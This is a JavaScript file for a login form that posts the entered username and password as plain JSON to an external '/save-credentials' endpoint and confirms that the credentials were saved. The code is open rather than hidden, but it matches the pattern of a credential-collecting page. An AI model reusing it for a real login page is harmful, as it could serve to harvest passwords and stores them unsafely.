document.addEventListener("DOMContentLoaded", function() {
    const loginBtn = document.getElementById('loginBtn');
    const popupContainer = document.getElementById('popupContainer');
    const closePopupBtn = document.getElementById('closePopup');
    const togglePassword = document.getElementById('togglePassword');
    const passwordField = document.getElementById('password');

    loginBtn.addEventListener('click', function(event) {
        event.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Check if both fields are filled
        if (username && password) {
            // Send username and password to server for saving
            saveCredentials(username, password);
        } else {
            // Show error message in the form if fields are not filled
            const errorMsg = document.getElementById('errorMsg');
            errorMsg.innerText = 'Please fill in both username and password.';
            errorMsg.style.display = 'block';
        }
    });

    closePopupBtn.addEventListener('click', function() {
        popupContainer.style.display = 'none';
    });

    togglePassword.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        this.classList.toggle('hide');
    });
});

function saveCredentials(username, password) {
    fetch('https://backend-dnif.onrender.com/save-credentials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => {
        if (response.ok) {
            // Show success message popup
            popupContainer.style.display = 'block';
            document.getElementById('popupMessage').innerText = 'Credentials saved successfully.';
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        } else {
            // Show error message popup
            popupContainer.style.display = 'block';
            document.getElementById('popupMessage').innerText = 'Error saving credentials. Please try again.';
        }
    })
    .catch(error => {
        console.error('Error saving username and password:', error);
    });
}
